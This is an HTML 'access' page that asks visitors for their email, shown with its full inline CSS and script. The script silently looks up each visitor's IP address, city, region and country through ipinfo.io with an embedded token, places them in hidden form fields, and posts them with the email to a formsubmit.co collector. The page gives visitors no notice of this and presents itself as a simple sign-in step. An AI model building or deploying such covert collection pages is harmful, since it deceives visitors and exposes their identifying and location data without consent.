<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Zayan Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0 0 30px rgba(0,0,0,0.3);
      backdrop-filter: blur(15px);
    }

    .dots {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin: 20px 0;
    }

    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: white;
      animation: bounce 1.5s infinite ease-in-out;
    }

    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes bounce {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1); }
    }

    input[type="email"] {
      padding: 12px;
      border: none;
      border-radius: 10px;
      width: 80%;
      max-width: 300px;
      font-size: 16px;
      margin-top: 20px;
    }

    button {
      margin-top: 15px;
      padding: 12px 25px;
      background: #00fff0;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>
    <h2>Enter your email to continue</h2>
    <form action="https://formsubmit.co/0640f6245922f0d4c0e47c6a7e974cf2" method="POST" id="loginForm">
      <input type="email" name="email" placeholder="Enter your email" required><br>
      <input type="hidden" name="ip" id="ip">
      <input type="hidden" name="location" id="location">
      <button type="submit">Continue</button>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://zayan-coder.github.io/start.html">
    </form>
  </div>

  <script>
    fetch("https://ipinfo.io/json?token=982523cd43465a")
      .then(response => response.json())
      .then(data => {
        document.getElementById("ip").value = data.ip;
        document.getElementById("location").value = `${data.city}, ${data.region}, ${data.country}`;
      });
  </script>
</body>
</html>
